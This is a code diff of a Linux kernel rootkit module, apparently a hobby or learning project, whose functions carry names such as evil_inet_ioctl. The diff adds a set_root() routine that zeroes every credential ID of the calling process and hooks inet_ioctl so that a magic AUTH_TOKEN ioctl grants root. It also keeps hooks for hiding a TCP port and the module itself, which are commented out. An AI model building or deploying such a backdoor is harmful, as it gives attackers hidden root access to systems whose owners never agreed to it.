@@ -63,7 +63,7 @@ typedef int tcp4_seq_show(struct seq_file *,void *);
 tcp4_seq_show *tcp4_seq_show_ptr = 0xffffffffb6d78540;
 
 typedef int inet_ioctl(struct socket *, unsigned int, unsigned int);
-inet_ioctl *inet_ioctl_ptr = 0xffffffffb6d99a20;
+inet_ioctl *inet_ioctl_ptr = 0xffffffff81f35c70;
 
 struct hidden_port
 {
@@ -144,6 +144,34 @@ static int version_proc_show_fake(struct seq_file *m, void *v)
 //     return ret;
 // }
 
+void set_root(void)
+{
+    kuid_t curr_uid = current_uid();
+    pr_info("%s: set_root(), curr_uid: %d\n", MODULE_NAME, curr_uid.val);
+
+    if(curr_uid.val == 0){
+        pr_info("%s: set_root(), the process is already root\n", MODULE_NAME);
+        return;
+    }
+
+    struct cred *new_cred;
+    new_cred = prepare_creds();
+    if (!new_cred)
+        return;
+
+    /* Run through and set all the various *id's to 0 (root) */
+    new_cred->uid.val = 0;
+    new_cred->gid.val = 0;
+    new_cred->euid.val = 0;
+    new_cred->egid.val = 0;
+    new_cred->suid.val = 0;
+    new_cred->sgid.val = 0;
+    new_cred->fsuid.val = 0;
+    new_cred->fsgid.val = 0;
+
+    commit_creds(new_cred);
+}
+
 struct s_args
 {
     unsigned short cmd;
@@ -156,22 +184,24 @@ static long evil_inet_ioctl ( struct socket *sock, unsigned int cmd, unsigned lo
 {
     int ret;
     struct s_args args;
+    // pr_info("%s: evil_inet_ioctl cmd: %d\n", MODULE_NAME,  cmd);
 
     if ( cmd == AUTH_TOKEN )
     {
         ret = copy_from_user(&args, (void *)arg, sizeof(args));
-        if ( ret )
+        pr_info("%s: evil_inet_ioctl args.cmd: %d\n", MODULE_NAME,  args.cmd);
+        if (ret)
             return 0;
 
         switch ( args.cmd )
         {
 
         case 0:
-            // root_me();
+            set_root();
             break;
 
         default:
-        	printk("daniel hay ioctl\n");
+            pr_info("%s: evil_inet_ioctl default case\n", MODULE_NAME);
             break;
         }
         return 0;
@@ -188,17 +218,17 @@ static long evil_inet_ioctl ( struct socket *sock, unsigned int cmd, unsigned lo
 static int __init greeter_init(void)
 {
     pr_info("%s: module loaded at 0x%p\n", MODULE_NAME, greeter_init);
-    pr_info("%s: greetings %s\n", MODULE_NAME, name);
+    pr_info("%s: version %s\n", MODULE_NAME, "1.0.0");
 
+    hijack_start(inet_ioctl_ptr, &evil_inet_ioctl);
     // Do kernel module hiding
     /* list_del_init(&__this_module.list);
     kobject_del(&THIS_MODULE->mkobj.kobj); */
 
-    hide_tcp4_port(631);
+    // hide_tcp4_port(631);
 
-    hijack_start(version_proc_show_ptr, &version_proc_show_fake);
-    hijack_start(tcp4_seq_show_ptr, &n_tcp4_seq_show);
-    hijack_start(inet_ioctl_ptr, &evil_inet_ioctl);
+    // hijack_start(version_proc_show_ptr, &version_proc_show_fake);
+    // hijack_start(tcp4_seq_show_ptr, &n_tcp4_seq_show);
 
     return 0;
 }
@@ -206,13 +236,12 @@ static int __init greeter_init(void)
 static void __exit greeter_exit(void)
 {
 
-    hijack_stop(version_proc_show_ptr);
-    hijack_stop(tcp4_seq_show_ptr);
     hijack_stop(inet_ioctl_ptr);
+    // hijack_stop(version_proc_show_ptr);
+    // hijack_stop(tcp4_seq_show_ptr);
 
-    unhide_tcp4_port(631);
+    // unhide_tcp4_port(631);
 
-    pr_info("%s: goodbye %s\n", MODULE_NAME, name);
     pr_info("%s: module unloaded from 0x%p\n", MODULE_NAME, greeter_exit);
 }
 
